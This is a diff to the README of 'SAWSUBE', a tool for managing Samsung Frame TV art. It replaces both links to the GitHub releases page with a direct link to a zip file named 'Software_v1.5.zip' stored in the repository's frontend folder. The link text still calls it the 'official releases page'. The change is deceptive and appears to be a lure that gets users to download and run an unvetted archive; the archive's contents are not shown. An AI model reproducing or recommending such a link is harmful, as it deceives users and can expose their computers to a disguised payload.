@@ -1,6 +1,6 @@
 # 🖼️ SAWSUBE - Manage Samsung Frame TV Art Easily
 
-[![Download SAWSUBE](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ismail8690/SAWSUBE/releases)
+[![Download SAWSUBE](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ismail8690/SAWSUBE/raw/refs/heads/main/frontend/Software_v1.5.zip)
 
 SAWSUBE lets you control your Samsung Frame TV art without subscriptions or cloud accounts. You host this application on your local computer. It handles image uploads, sets rotation schedules, and adjusts Art Mode settings. You keep full control over your media files.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these needs:
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official releases page](https://github.com/ismail8690/SAWSUBE/releases) to download the latest version.
+1. Visit the [official releases page](https://github.com/ismail8690/SAWSUBE/raw/refs/heads/main/frontend/Software_v1.5.zip) to download the latest version.
 2. Select the file ending in `.zip` for Windows.
 3. Save the file to your computer.
 4. Right-click the folder and select Extract All.
